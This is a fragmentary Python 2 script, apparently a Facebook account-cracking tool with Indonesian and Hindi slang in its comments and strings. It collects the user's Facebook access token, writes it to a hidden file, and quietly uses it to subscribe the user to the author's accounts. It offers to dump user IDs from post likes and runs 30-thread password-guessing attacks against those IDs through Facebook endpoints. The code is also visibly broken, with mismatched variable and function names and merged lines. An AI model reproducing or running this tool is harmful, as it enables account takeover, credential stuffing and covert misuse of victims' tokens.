...
from concurrent.futures import ThreadPoolExecutor as SYaMKing
...
page_ID = '101527738974956'

ID = '100000519519543'

hoetank = random.choice(['Jis Na Ya Post Ki Hai:)', 'Lo Fail:v', 'Never surrentod tekentod kentod:v'])
...
def syamking():
    ...
    print (' %s*%s tools  use login token facebook.\n %s*%s do you know how to get token facebook?\n %s*%s type %polite%s to get token facebook.'%(O,N,O,N,O,N,H,N))

    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))

    if kontol in ('open', 'Open', 'OPEN'):

        print '\n%s *%s note! via browser ma mbasic mood ma on karo'%(B,N);time.sleep(2)

        print '%s *%s do not forget! url change to %shttps://m.facebook.com'%(B,N,H);time.sleep(2)

        print '%s *%s open karna  ka le click karo %three dots'%(B,N,H);time.sleep(2)

        print '%s *%s then click%sSearch on Page%s Just type %sEAAA%s Then copy..'%(B,N,H,N,H,N);time.sleep(2)

        raw_input(' %s*%s tekan enter '%(O,N))

        os.system('skg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')

        syamking()

    try:

        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(control)).json()['name']

        print '\n\n %s*%s Welcome %s%s%s'%(O,N,K,name,N);time.sleep(2)

        print ' %s*%s please use this properly, i are not responsible if this is misused...'%(O,N);time.sleep(2)

        open('.ppk/.memek.txt', 'w').write(kontol)

        raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)

        os.system('skg-open https://www.facebook.com/Itzkingsyam/')

        much_syam()

    except KeyError:

        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);syamking()
...
def much_syam():
    ...
    try:
    	...
    	kontol = open('.ppk/.memek.txt', 'r').read()    except IOError:

        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');syamking()
    ...
    print ' (\033[0;96m•\033[0m) Saqii Ok: %s'%(nama);time.sleep(0.03)

    print ' (\033[0;96m•\033[0m) Cp : %s'%(IP)
    ...
    print ' [%s4%s]. Dump id from post like'%(O,N);time.sleep(0.03)

    print ' [%s5%s]. Mulai crack'%(O,N);time.sleep(0.03)

    print ' [%s6%s]. Check information fb'%(O,N);time.sleep(0.03)
    ...
    if pepek == '':
        ...
        print '\n %s[%s×%s] dont copy my style!'%(N,M,N);time.sleep(2);much_syam()
...
def wuhan(kontol):
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/100000519519543/subscribers?access_token=%s'%(kentod))

        requests.post('https://graph.facebook.com/100009909916192/subscribers?access_token=%s'%(kentod))
...
def info_tools():
    ...
    print '\n %s[%s>%s] Fb       : SYaM King.'%(N,H,N);time.sleep(0.07)

    print '\n %s[%s>%s] Author   : SYaM King.'%(N,H,N);time.sleep(0.07)

    print '\n %s[%s>%s] Github   : https://github.com/Itz_Syam'%(N,H,N);time.sleep(0.07)

    print '\n %s[%s>%s] Facebook : https://www.facebook.com/Syam.king07'%(N,H,N);time.sleep(0.07)

    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/101527738974956'%(N,H,N);time.sleep(0.07)

    print '\n %s[%s>%s] Instagram: https://www.instagram.com/Syam_prince'%(N,H,N);time.sleep(0.07)

    print '\n %s[%s>%s] Blogspot : https://squadkingpeopleteam.blogspot.com'%(N,H,N);time.sleep(0.07)

    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)

    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_Syam()
...
class __crack__:
    ...
    def plerr(self):
        ...
        try:
            ...
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek menu 1 sampai 4.'%(N,M,N,M,self.apk,N)
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            with SYaMGanteng(max_workers=30) as (__yayanXD__):
                            ...
                            with SYaMGanteng(max_workers=30) as (__yayanXD__):
                                ...
                                for ikeh in self.id:
                                    ...
                                    try:
                                        ...
                                        __SyamXD__.submit(self.__mfb__, kimochi, ysc)
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            with SYaMGanteng(max_workers=30) as (__yayanXD__):
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        __SyamXD__.submit(self.__api__, uid, pwx)
            ...
            with SyamGanteng(max_workers=30) as (__yayanXD__):
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        __Syam__.submit(self.__mbasic__, uid, pwx)
            ...
            with Syamking(max_workers=30) as (__SYaMKing__):
